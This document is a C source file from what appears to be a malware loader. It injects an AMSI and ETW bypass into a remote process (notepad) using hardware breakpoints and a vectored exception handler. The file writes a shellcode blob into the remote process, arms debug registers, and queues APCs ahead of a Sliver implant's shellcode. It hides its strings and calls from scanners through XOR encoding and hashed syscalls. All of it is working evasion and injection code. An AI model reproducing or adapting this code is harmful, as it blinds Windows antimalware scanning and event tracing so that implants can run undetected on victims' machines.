/*
 * remote_hwbp.c — Install AMSI + ETW HWBP bypass inside a remote process.
 *
 * The primitive stages a small position-independent blob into the remote
 * process containing:
 *   (a) a bootstrap routine that calls RtlAddVectoredExceptionHandler(1, &veh)
 *       — this is queued as an APC on the suspended remote thread, so it runs
 *       as the FIRST thing when the thread is resumed, before the actual
 *       Sliver shellcode APC.
 *   (b) a VEH that catches EXCEPTION_SINGLE_STEP, matches RIP against the
 *       breakpoint target addresses (ETW / AMSI), writes RAX=0 (and *result
 *       for AMSI), pops the return address off the stack, continues.
 *
 * Patched slots at the tail of the blob:
 *   add_veh_ptr  — RtlAddVectoredExceptionHandler address
 *   etw_addr     — EtwEventWrite address (or 0 to disable that branch)
 *   amsi_addr    — AmsiScanBuffer address (or 0 to disable that branch)
 *
 * All references inside the blob are RIP-relative or register-indirect,
 * so the blob is relocatable: the loader copies it byte-for-byte into
 * the remote process and the internal references still resolve.
 *
 * DR arming: happens from THIS loader on the suspended remote thread via
 * NtSetContextThread, before ResumeThread. DR0 = amsi, DR1 = etw. DR7
 * enables local slots, type=exec, len=1.
 */

#include "remote_hwbp.h"
#include "peb.h"
#include "halos.h"
#include "obfuscation.h"
#include <winternl.h>
#include <string.h>

/* amsi.dll (ASCII, 6-byte rolling XOR) — same encoding as etw.c; used to
 * stage the ANSI buffer into the remote process for LoadLibraryA. */
static const uint8_t _enc_key_amsi_rem[6] = { 0xed, 0x72, 0xed, 0x1a, 0x9a, 0x13 };
static const uint8_t _enc_amsidll_rem[]   = {
    0x8c, 0x1f, 0x9e, 0x73, 0xb4, 0x77, 0x81, 0x1e
};

/* amsi.dll (wide UTF-16LE, 6-byte rolling XOR) — for remote_find_module()
 * PEB poll + loader-side peb_get_module(). Keeps the wide literal out of
 * .rdata so static scanners can't key on the LDR_MODULE name. */
static const uint8_t _enc_key_amsi_w_rem[6] = { 0x7a, 0x4e, 0xb3, 0xd1, 0x5f, 0x28 };
static const uint8_t _enc_amsidll_w_rem[]   = {
    0x1b, 0x4e, 0xde, 0xd1, 0x2c, 0x28, 0x13, 0x4e,
    0x9d, 0xd1, 0x3b, 0x28, 0x16, 0x4e, 0xdf, 0xd1
};

#ifndef CONTEXT_DEBUG_REGISTERS
#define CONTEXT_DEBUG_REGISTERS 0x00100010
#endif

/* ================================================================== */
/* The embedded blob. Naked function so GCC emits only the asm we wrote.
 * `.global` labels inside the inline asm become externally addressable
 * symbols we reference from C below to compute offsets and patch slots. */
/* ================================================================== */
extern uint8_t rhwbp_blob_start[], rhwbp_blob_end[];
extern uint8_t rhwbp_veh_entry[];
extern uint8_t rhwbp_add_veh_slot[];
extern uint8_t rhwbp_etw_slot[];
extern uint8_t rhwbp_amsi_slot[];

__attribute__((naked, used))
static void rhwbp_blob(void)
{
    __asm__ volatile (
        ".global rhwbp_blob_start                         \n"
        "rhwbp_blob_start:                                \n"
        /* --- bootstrap entry (APC callback) --- */
        /* Standard APC signature: rcx = ULONG_PTR param (we ignore it). */
        "   push %rbp                                     \n"
        "   mov  %rsp, %rbp                               \n"
        "   sub  $0x30, %rsp                              \n"
        "   mov  $1, %rcx                                 \n"
        "   lea  rhwbp_veh_entry(%rip), %rdx              \n"
        "   mov  rhwbp_add_veh_slot(%rip), %rax           \n"
        "   call *%rax                                    \n"
        "   mov  %rbp, %rsp                               \n"
        "   pop  %rbp                                     \n"
        "   ret                                           \n"

        /* --- VEH handler --- */
        ".align 16                                        \n"
        ".global rhwbp_veh_entry                          \n"
        "rhwbp_veh_entry:                                 \n"
        /* rcx = PEXCEPTION_POINTERS
         * Preserve rbx, give ourselves shadow space for any nested calls
         * we might add later. */
        "   push %rbx                                     \n"
        "   sub  $0x20, %rsp                              \n"
        "   mov  (%rcx), %rax                             \n"   /* ExceptionRecord* */
        "   mov  (%rax), %eax                             \n"   /* ExceptionCode */
        "   cmpl $0x80000004, %eax                        \n"   /* STATUS_SINGLE_STEP */
        "   jne  1f                                       \n"
        "   mov  8(%rcx), %r8                             \n"   /* ContextRecord* */
        "   mov  0xF8(%r8), %r9                           \n"   /* ->Rip */
        /* ETW check */
        "   mov  rhwbp_etw_slot(%rip), %rax               \n"
        "   test %rax, %rax                               \n"
        "   jz   2f                                       \n"
        "   cmp  %rax, %r9                                \n"
        "   je   3f                                       \n"
        "2:                                               \n"
        /* AMSI check */
        "   mov  rhwbp_amsi_slot(%rip), %rax              \n"
        "   test %rax, %rax                               \n"
        "   jz   1f                                       \n"
        "   cmp  %rax, %r9                                \n"
        "   je   4f                                       \n"
        "1:                                               \n"   /* continue search */
        "   xor  %eax, %eax                               \n"
        "   add  $0x20, %rsp                              \n"
        "   pop  %rbx                                     \n"
        "   ret                                           \n"

        "4:                                               \n"   /* handle_amsi */
        "   mov  0x98(%r8), %rax                          \n"   /* Rsp */
        "   mov  0x30(%rax), %r10                         \n"   /* arg6 = AMSI_RESULT* */
        "   test %r10, %r10                               \n"
        "   jz   5f                                       \n"
        "   movl $0, (%r10)                               \n"   /* AMSI_RESULT_CLEAN */
        "5:                                               \n"
        "   jmp  6f                                       \n"

        "3:                                               \n"   /* handle_etw */
        "   mov  0x98(%r8), %rax                          \n"   /* Rsp */

        "6:                                               \n"   /* common_ret */
        "   movq $0, 0x78(%r8)                            \n"   /* ctx->Rax = 0 */
        "   mov  (%rax), %r9                              \n"   /* r9 = *Rsp */
        "   mov  %r9, 0xF8(%r8)                           \n"   /* ctx->Rip = *Rsp */
        "   add  $8, %rax                                 \n"
        "   mov  %rax, 0x98(%r8)                          \n"   /* ctx->Rsp += 8 */
        "   movq $0, 0x68(%r8)                            \n"   /* ctx->Dr6 = 0 */
        "   mov  0x44(%r8), %r11d                         \n"   /* ctx->EFlags */
        "   or   $0x10000, %r11d                          \n"   /* |= RF */
        "   mov  %r11d, 0x44(%r8)                         \n"
        "   mov  $-1, %eax                                \n"   /* EXCEPTION_CONTINUE_EXECUTION */
        "   add  $0x20, %rsp                              \n"
        "   pop  %rbx                                     \n"
        "   ret                                           \n"

        /* --- patch slots (at the tail of the blob) --- */
        ".align 8                                         \n"
        ".global rhwbp_add_veh_slot                       \n"
        "rhwbp_add_veh_slot:  .quad 0                     \n"
        ".global rhwbp_etw_slot                           \n"
        "rhwbp_etw_slot:      .quad 0                     \n"
        ".global rhwbp_amsi_slot                          \n"
        "rhwbp_amsi_slot:     .quad 0                     \n"

        ".global rhwbp_blob_end                           \n"
        "rhwbp_blob_end:                                  \n"
    );
}

/* ================================================================== */
/* Helpers                                                              */
/* ================================================================== */

static BOOL remote_alloc(HANDLE hProc, SIZE_T size, PVOID *base_out)
{
    PVOID base = NULL;
    SIZE_T region = size;
    NTSTATUS st = halos_invoke_hash(HASH_NtAllocateVirtualMemory,
                                    hProc, &base, (void *)0, &region,
                                    (void *)(MEM_COMMIT | MEM_RESERVE),
                                    (void *)PAGE_READWRITE);
    if (st < 0 || !base) return FALSE;
    *base_out = base;
    return TRUE;
}

static BOOL remote_write(HANDLE hProc, PVOID remote, const void *local, SIZE_T len)
{
    SIZE_T written = 0;
    NTSTATUS st = halos_invoke_hash(HASH_NtWriteVirtualMemory,
                                    hProc, remote, (void *)local,
                                    (void *)len, &written, NULL);
    return st >= 0 && written == len;
}

static BOOL remote_flip_rx(HANDLE hProc, PVOID remote, SIZE_T len)
{
    PVOID base = remote;
    SIZE_T region = len;
    ULONG oldProt = 0;
    NTSTATUS st = halos_invoke_hash(HASH_NtProtectVirtualMemory,
                                    hProc, &base, &region,
                                    (void *)PAGE_EXECUTE_READ, &oldProt, NULL);
    return st >= 0;
}

static BOOL remote_arm_drs(HANDLE hThread, DWORD64 amsi_addr, DWORD64 etw_addr)
{
    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    NTSTATUS st = halos_invoke_hash(HASH_NtGetContextThread,
                                    hThread, &ctx,
                                    NULL, NULL, NULL, NULL);
    if (st < 0) return FALSE;

    DWORD64 dr7 = ctx.Dr7;
    if (amsi_addr) {
        ctx.Dr0 = amsi_addr;
        dr7 |= (DWORD64)1 << 0;                 /* L0 enable */
        dr7 &= ~((DWORD64)0xF << 16);           /* slot 0: type=exec, len=1 */
    }
    if (etw_addr) {
        ctx.Dr1 = etw_addr;
        dr7 |= (DWORD64)1 << 2;                 /* L1 enable */
        dr7 &= ~((DWORD64)0xF << 20);           /* slot 1: type=exec, len=1 */
    }
    ctx.Dr7 = dr7;

    st = halos_invoke_hash(HASH_NtSetContextThread,
                           hThread, &ctx,
                           NULL, NULL, NULL, NULL);
    return st >= 0;
}

/* ================================================================== */
BOOL remote_hwbp_install(HANDLE hProcess, HANDLE hThread,
                         PVOID *bootstrap_entry_out)
{
    if (bootstrap_entry_out) *bootstrap_entry_out = NULL;

    /* 1. Resolve the addresses we're going to bake into the blob. */
    HMODULE ntdll = peb_get_ntdll();
    if (!ntdll) {
        DBG_PRINTF("[rhwbp] peb_get_ntdll failed\n");
        return FALSE;
    }
    FARPROC pAddVEH = peb_find_export(ntdll, HASH_RtlAddVectoredExceptionHandler);
    FARPROC pEtw    = peb_find_export(ntdll, HASH_EtwEventWrite);
    if (!pAddVEH || !pEtw) {
        DBG_PRINTF("[rhwbp] export resolve failed: addveh=%p etw=%p\n",
                   pAddVEH, pEtw);
        return FALSE;
    }

    /* amsi.dll: only present in notepad if we force-load it. We don't
     * (LoadLibrary from an APC is deadlock-prone on the loader lock),
     * so amsi_addr stays 0 and the VEH's AMSI branch is a no-op. If
     * this loader process has amsi.dll loaded (from amsi_patch() in
     * stage 1), we grab its AmsiScanBuffer — ntdll is shared, but
     * amsi.dll is NOT necessarily at the same base in notepad. We set
     * to 0 unless the notepad path is known to have loaded it. */
    DWORD64 amsi_addr = 0;
    (void)_enc_key_amsi_rem;
    (void)_enc_amsidll_rem;

    DWORD64 etw_addr    = (DWORD64)(ULONG_PTR)pEtw;
    DWORD64 add_veh_ptr = (DWORD64)(ULONG_PTR)pAddVEH;

    /* 2. Copy the blob into a local buffer and patch its three slots. */
    SIZE_T blob_len = (SIZE_T)(rhwbp_blob_end - rhwbp_blob_start);
    if (blob_len == 0 || blob_len > 4096) {
        DBG_PRINTF("[rhwbp] bad blob_len=%zu\n", blob_len);
        return FALSE;
    }
    uint8_t staging[4096];
    memcpy(staging, rhwbp_blob_start, blob_len);

    SIZE_T off_add_veh = (SIZE_T)(rhwbp_add_veh_slot - rhwbp_blob_start);
    SIZE_T off_etw     = (SIZE_T)(rhwbp_etw_slot     - rhwbp_blob_start);
    SIZE_T off_amsi    = (SIZE_T)(rhwbp_amsi_slot    - rhwbp_blob_start);
    SIZE_T off_veh     = (SIZE_T)(rhwbp_veh_entry    - rhwbp_blob_start);
    memcpy(staging + off_add_veh, &add_veh_ptr, 8);
    memcpy(staging + off_etw,     &etw_addr,    8);
    memcpy(staging + off_amsi,    &amsi_addr,   8);

    DBG_PRINTF("[rhwbp] blob_len=%zu off_veh=%zu off_add_veh=%zu off_etw=%zu off_amsi=%zu\n",
               blob_len, off_veh, off_add_veh, off_etw, off_amsi);
    DBG_PRINTF("[rhwbp] patch: add_veh=%p etw=%p amsi=%p\n",
               (void *)(ULONG_PTR)add_veh_ptr,
               (void *)(ULONG_PTR)etw_addr,
               (void *)(ULONG_PTR)amsi_addr);

    /* 3. Allocate in remote, write, flip RX. */
    PVOID remote_base = NULL;
    if (!remote_alloc(hProcess, blob_len, &remote_base)) {
        DBG_PRINTF("[rhwbp] remote alloc failed\n");
        return FALSE;
    }
    if (!remote_write(hProcess, remote_base, staging, blob_len)) {
        DBG_PRINTF("[rhwbp] remote write failed\n");
        return FALSE;
    }
    if (!remote_flip_rx(hProcess, remote_base, blob_len)) {
        DBG_PRINTF("[rhwbp] remote RX flip failed\n");
        return FALSE;
    }

    /* 4. Arm DR0/DR1 on the suspended remote thread. */
    if (!remote_arm_drs(hThread, amsi_addr, etw_addr)) {
        DBG_PRINTF("[rhwbp] DR arm failed\n");
        /* non-fatal: VEH is installed, HWBP just not armed. return the
         * bootstrap anyway so the VEH gets planted. */
    } else {
        DBG_PRINTF("[rhwbp] DRs armed: DR1=EtwEventWrite=%p\n",
                   (void *)(ULONG_PTR)etw_addr);
    }

    if (bootstrap_entry_out)
        *bootstrap_entry_out = remote_base;

    DBG_PRINTF("[rhwbp] bootstrap entry at %p (remote)\n", remote_base);
    return TRUE;
}

/* ================================================================== */
/* Third-APC + re-arm — load amsi.dll inside the host, then arm DR0.   */
/* ================================================================== */

/* x64 PEB / PEB_LDR_DATA / LDR_DATA_TABLE_ENTRY offsets (stable since
 * Win8 and verified on Win11 24H2). Using raw offsets to avoid pulling
 * in half of phnt just for one walk. */
#define OFF_PEB_LDR                 0x018
#define OFF_LDR_INLOADORDER_LIST    0x010
#define OFF_LDRENTRY_DLLBASE        0x030
#define OFF_LDRENTRY_BASEDLLNAME    0x058

/* NtQueryInformationProcess(ProcessBasicInformation) shape. Declared
 * locally so we don't have to pull in <ntstatus.h> / phnt. */
typedef struct _RHWBP_PBI {
    LONG       ExitStatus;
    PVOID      PebBaseAddress;
    ULONG_PTR  AffinityMask;
    LONG       BasePriority;
    ULONG_PTR  UniqueProcessId;
    ULONG_PTR  InheritedFromUniqueProcessId;
} RHWBP_PBI;

#ifndef QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
#define QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC 0x1
#endif

static BOOL rmem_read(HANDLE hProc, PVOID remote, void *local, SIZE_T len)
{
    SIZE_T got = 0;
    NTSTATUS st = halos_invoke_hash(HASH_NtReadVirtualMemory,
                                    hProc, remote, local,
                                    (void *)len, &got, NULL);
    return st >= 0 && got == len;
}

/* Case-insensitive ASCII wide-string compare. */
static int wstr_iequal(const wchar_t *a, const wchar_t *b, size_t n)
{
    for (size_t i = 0; i < n; i++) {
        wchar_t ca = a[i], cb = b[i];
        if (ca >= L'A' && ca <= L'Z') ca += 32;
        if (cb >= L'A' && cb <= L'Z') cb += 32;
        if (ca != cb) return 0;
    }
    return 1;
}

/* Walk hProc's PEB_LDR_DATA.InLoadOrderModuleList and return the
 * DllBase of the first entry whose BaseDllName matches `name` (case-
 * insensitive). Returns 0 if not found or on any read failure. */
static DWORD64 remote_find_module(HANDLE hProc, const wchar_t *name, size_t name_len)
{
    RHWBP_PBI pbi;
    ZeroMemory(&pbi, sizeof(pbi));
    ULONG ret_len = 0;
    NTSTATUS st = halos_invoke_hash(HASH_NtQueryInformationProcess,
                                    hProc, (void *)0, /* ProcessBasicInformation */
                                    &pbi, (void *)(ULONG_PTR)sizeof(pbi),
                                    &ret_len, NULL);
    if (st < 0 || !pbi.PebBaseAddress) return 0;

    PVOID ldr = NULL;
    if (!rmem_read(hProc, (uint8_t *)pbi.PebBaseAddress + OFF_PEB_LDR,
                   &ldr, sizeof(ldr)) || !ldr)
        return 0;

    PVOID head_addr = (uint8_t *)ldr + OFF_LDR_INLOADORDER_LIST;
    LIST_ENTRY head;
    if (!rmem_read(hProc, head_addr, &head, sizeof(head)))
        return 0;

    PVOID cur = head.Flink;
    wchar_t buf[128];
    for (int i = 0; i < 512 && cur && cur != head_addr; i++) {
        /* InLoadOrderLinks is at offset 0 of LDR_DATA_TABLE_ENTRY,
         * so `cur` IS the entry pointer. */
        UNICODE_STRING us;
        if (!rmem_read(hProc, (uint8_t *)cur + OFF_LDRENTRY_BASEDLLNAME,
                       &us, sizeof(us)))
            return 0;
        if (us.Length >= 2 &&
            us.Length <= (USHORT)(sizeof(buf) - sizeof(wchar_t)) &&
            us.Buffer &&
            (us.Length / sizeof(wchar_t)) == name_len &&
            rmem_read(hProc, us.Buffer, buf, us.Length))
        {
            buf[us.Length / sizeof(wchar_t)] = 0;
            if (wstr_iequal(buf, name, name_len)) {
                DWORD64 base = 0;
                if (rmem_read(hProc, (uint8_t *)cur + OFF_LDRENTRY_DLLBASE,
                              &base, sizeof(base)))
                    return base;
                return 0;
            }
        }
        LIST_ENTRY le;
        if (!rmem_read(hProc, cur, &le, sizeof(le)))
            return 0;
        cur = le.Flink;
    }
    return 0;
}

/* Arm DR0 on hThread to fire on `addr` (type=exec, len=1, L0 enable).
 * Thread is suspended across the context write. */
static BOOL remote_arm_dr0(HANDLE hThread, DWORD64 addr)
{
    NTSTATUS st = halos_invoke_hash(HASH_NtSuspendThread,
                                    hThread, NULL, NULL, NULL, NULL, NULL);
    if (st < 0) { DBG_PRINTF("[rhwbp-amsi] NtSuspendThread failed: 0x%lX\n", st); return FALSE; }

    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    st = halos_invoke_hash(HASH_NtGetContextThread,
                           hThread, &ctx, NULL, NULL, NULL, NULL);
    if (st < 0) {
        DBG_PRINTF("[rhwbp-amsi] NtGetContextThread failed: 0x%lX\n", st);
        halos_invoke_hash(HASH_NtResumeThread, hThread, NULL, NULL, NULL, NULL, NULL);
        return FALSE;
    }

    ctx.Dr0 = addr;
    DWORD64 dr7 = ctx.Dr7;
    dr7 |=  (DWORD64)1 << 0;          /* L0 enable                     */
    dr7 &= ~((DWORD64)0xF << 16);     /* slot 0: type=exec(00), len=1(00) */
    ctx.Dr7 = dr7;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    st = halos_invoke_hash(HASH_NtSetContextThread,
                           hThread, &ctx, NULL, NULL, NULL, NULL);
    NTSTATUS st_res = halos_invoke_hash(HASH_NtResumeThread,
                                        hThread, NULL, NULL, NULL, NULL, NULL);
    (void)st_res;
    if (st < 0) { DBG_PRINTF("[rhwbp-amsi] NtSetContextThread failed: 0x%lX\n", st); return FALSE; }
    return TRUE;
}

BOOL remote_hwbp_finish_amsi(HANDLE hProcess, HANDLE hThread,
                             PVOID blob_remote_base)
{
    if (!hProcess || !hThread || !blob_remote_base) return FALSE;

    /* 1. Resolve LoadLibraryA from the loader's kernel32 — shared base
     *    across processes, so it's valid in the host too. */
    FARPROC pLoadLib = peb_resolve_kernel32(HASH_LoadLibraryA);
    if (!pLoadLib) {
        DBG_PRINTF("[rhwbp-amsi] LoadLibraryA not resolved\n");
        return FALSE;
    }

    /* 2. Decode "amsi.dll" and stage it in a remote RW page. */
    char local_name[16];
    ZeroMemory(local_name, sizeof(local_name));
    xor_dec_mb(local_name, _enc_amsidll_rem, 8, _enc_key_amsi_rem, 6);
    local_name[8] = 0;

    PVOID remote_str = NULL;
    SIZE_T region = 4096;
    NTSTATUS st = halos_invoke_hash(HASH_NtAllocateVirtualMemory,
                                    hProcess, &remote_str, (void *)0, &region,
                                    (void *)(MEM_COMMIT | MEM_RESERVE),
                                    (void *)PAGE_READWRITE);
    if (st < 0 || !remote_str) {
        DBG_PRINTF("[rhwbp-amsi] remote alloc for string failed: 0x%lX\n", st);
        secure_zero(local_name, sizeof(local_name));
        return FALSE;
    }
    SIZE_T wrote = 0;
    st = halos_invoke_hash(HASH_NtWriteVirtualMemory,
                           hProcess, remote_str, local_name,
                           (void *)9, &wrote, NULL);
    secure_zero(local_name, sizeof(local_name));
    if (st < 0 || wrote != 9) {
        DBG_PRINTF("[rhwbp-amsi] remote write string failed: 0x%lX\n", st);
        return FALSE;
    }

    /* 3. Queue SpecialUserAPC(LoadLibraryA, remote_str). Flag 0x1 in the
     *    second arg forces the APC to fire even in a non-alertable wait
     *    (Win10 1809+). The Sliver APC is running on this thread right
     *    now and typically parks in a non-alertable sleep / recv. */
    st = halos_invoke_hash(HASH_NtQueueApcThreadEx,
                           hThread,
                           (void *)(ULONG_PTR)QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
                           (void *)pLoadLib, remote_str, NULL, NULL);
    if (st < 0) {
        DBG_PRINTF("[rhwbp-amsi] NtQueueApcThreadEx failed: 0x%lX, falling back to NtQueueApcThread\n", st);
        st = halos_invoke_hash(HASH_NtQueueApcThread,
                               hThread, (void *)pLoadLib,
                               remote_str, NULL, NULL, NULL);
        if (st < 0) {
            DBG_PRINTF("[rhwbp-amsi] NtQueueApcThread fallback failed: 0x%lX\n", st);
            return FALSE;
        }
    }
    DBG_PRINTF("[rhwbp-amsi] LoadLibraryA APC queued on remote thread (arg=%p)\n",
               remote_str);

    /* 4. Poll remote PEB for amsi.dll. Up to ~5s in 100ms steps. */
    FARPROC pSleep = peb_resolve_kernel32(HASH_Sleep);
    typedef void (WINAPI *Sleep_t)(DWORD);
    DWORD64 remote_amsi_base = 0;
    wchar_t amsidll_w[9];
    xor_dec_w_mb(amsidll_w, _enc_amsidll_w_rem, 8, _enc_key_amsi_w_rem, 6);
    const size_t amsidll_len = 8;
    for (int i = 0; i < 50; i++) {
        remote_amsi_base = remote_find_module(hProcess, amsidll_w, amsidll_len);
        if (remote_amsi_base) break;
        if (pSleep) ((Sleep_t)pSleep)(100);
    }
    if (!remote_amsi_base) {
        DBG_PRINTF("[rhwbp-amsi] amsi.dll never appeared in remote PEB\n");
        return FALSE;
    }
    DBG_PRINTF("[rhwbp-amsi] remote amsi.dll base = %p\n",
               (void *)(ULONG_PTR)remote_amsi_base);

    /* 5. Compute remote AmsiScanBuffer VA via this process's amsi.dll. */
    HMODULE loader_amsi = peb_get_module(amsidll_w);
    secure_zero(amsidll_w, sizeof(amsidll_w));
    if (!loader_amsi) {
        DBG_PRINTF("[rhwbp-amsi] loader has no amsi.dll (amsi_patch not run?)\n");
        return FALSE;
    }
    FARPROC loader_scan = peb_find_export(loader_amsi, HASH_AmsiScanBuffer);
    if (!loader_scan) {
        DBG_PRINTF("[rhwbp-amsi] loader AmsiScanBuffer export not found\n");
        return FALSE;
    }
    DWORD64 rva = (DWORD64)(ULONG_PTR)loader_scan - (DWORD64)(ULONG_PTR)loader_amsi;
    DWORD64 remote_scan = remote_amsi_base + rva;
    DBG_PRINTF("[rhwbp-amsi] remote AmsiScanBuffer = %p (rva=0x%llX)\n",
               (void *)(ULONG_PTR)remote_scan, (unsigned long long)rva);

    /* 6. Patch the blob's amsi_slot so the VEH's RIP compare matches.
     *    The blob page is RX; flip to RW, write 8 bytes, flip back. */
    SIZE_T off_amsi = (SIZE_T)(rhwbp_amsi_slot - rhwbp_blob_start);
    PVOID  slot_remote = (uint8_t *)blob_remote_base + off_amsi;

    PVOID  flip_base = slot_remote;
    SIZE_T flip_size = 8;
    ULONG  old_prot  = 0;
    st = halos_invoke_hash(HASH_NtProtectVirtualMemory,
                           hProcess, &flip_base, &flip_size,
                           (void *)PAGE_READWRITE, &old_prot, NULL);
    if (st < 0) {
        DBG_PRINTF("[rhwbp-amsi] slot RW flip failed: 0x%lX\n", st);
        return FALSE;
    }
    st = halos_invoke_hash(HASH_NtWriteVirtualMemory,
                           hProcess, slot_remote, &remote_scan,
                           (void *)8, &wrote, NULL);
    if (st < 0 || wrote != 8) {
        DBG_PRINTF("[rhwbp-amsi] slot write failed: 0x%lX wrote=%zu\n",
                   st, (size_t)wrote);
    }
    ULONG tmp_prot = 0;
    flip_base = slot_remote; flip_size = 8;
    halos_invoke_hash(HASH_NtProtectVirtualMemory,
                      hProcess, &flip_base, &flip_size,
                      (void *)(ULONG_PTR)old_prot, &tmp_prot, NULL);
    DBG_PRINTF("[rhwbp-amsi] blob amsi_slot patched @ %p\n", slot_remote);

    /* 7. Suspend / set DR0 / resume. From here on, every AmsiScanBuffer
     *    call inside the host raises #DB → VEH writes 0 to *result and
     *    S_OK to RAX → caller sees clean. */
    if (!remote_arm_dr0(hThread, remote_scan))
        return FALSE;

    DBG_PRINTF("[rhwbp-amsi] DR0 armed on remote thread: AmsiScanBuffer @ %p\n",
               (void *)(ULONG_PTR)remote_scan);
    return TRUE;
}
